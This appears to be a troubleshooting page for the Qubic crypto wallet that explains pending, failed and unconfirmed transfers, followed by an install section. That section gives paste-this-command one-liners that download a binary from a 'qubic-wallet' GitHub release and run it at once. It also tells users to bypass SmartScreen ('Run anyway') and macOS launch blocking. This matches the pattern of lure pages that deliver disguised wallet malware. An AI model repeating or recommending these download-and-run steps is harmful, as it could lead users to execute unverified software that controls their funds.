The states described follow the [current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2) transfer and status routes.

> A pending transfer is not a lost one. A resent transfer is a second one.

A Qubic Wallet transfer can look stuck for four different reasons: it is submitted and waiting for a tick, it failed before submission, the app has not refreshed, or you are reading a different account. Only one of those is a reason to send again, and telling them apart takes a status read rather than patience.

## The four states

| State | What it means | What to do |
| --- | --- | --- |
| Submitted, awaiting a tick | Broadcast and pending | Wait, then read the status |
| Confirmed, not shown | Accepted; the read is stale | Refresh the account |
| Failed | Rejected before or at submission | Fix the cause, then send deliberately |
| Unknown, balance unchanged | The read is from another account or network | Check account and network before anything else |

## The retry rule

Retry only after a state read says the first transfer failed. Resending into an unknown duplicates a transfer, and a duplicate is worse than a delay because it is not reversible.

Keep the identifier from the first attempt; it is what makes the difference between the states knowable.

## What causes a failure

A wrong amount, an address from another network, or a connection that dropped mid-flow. Each is visible before the send if you read the confirmation screen, which is what the <a href="https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-send-qu-tokens.md">send walkthrough</a> covers.

## Confirming it yourself

Read the identifier against the network rather than the window, using the <a href="https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-block-explorer-verify.md">verification method</a>. If the network has it, the wallet is behind; if it does not, the transfer never landed.

Run the check on the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a> so the status labels mean what this page says.

## FAQ

### How long is too long to wait?

A transfer confirms at a tick, so minutes rather than hours. A long wait is a reason to read the status.

### Can I cancel a pending transfer?

No. Nothing in the wallet can withdraw a submitted transfer.

### Will it eventually fail on its own?

A transfer either confirms or is rejected. An indefinite pending state is a read problem more often than a network one.

### Should I resend with a higher fee?

There is no fee-bumping control here, and resending creates a second transfer.

### What if the balance did not change after a confirmed transfer?

Refresh the read, then confirm you are in the account that sent.

### Is a failed transfer charged?

Read the fee shown at confirmation; the wallet charges nothing itself.

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.
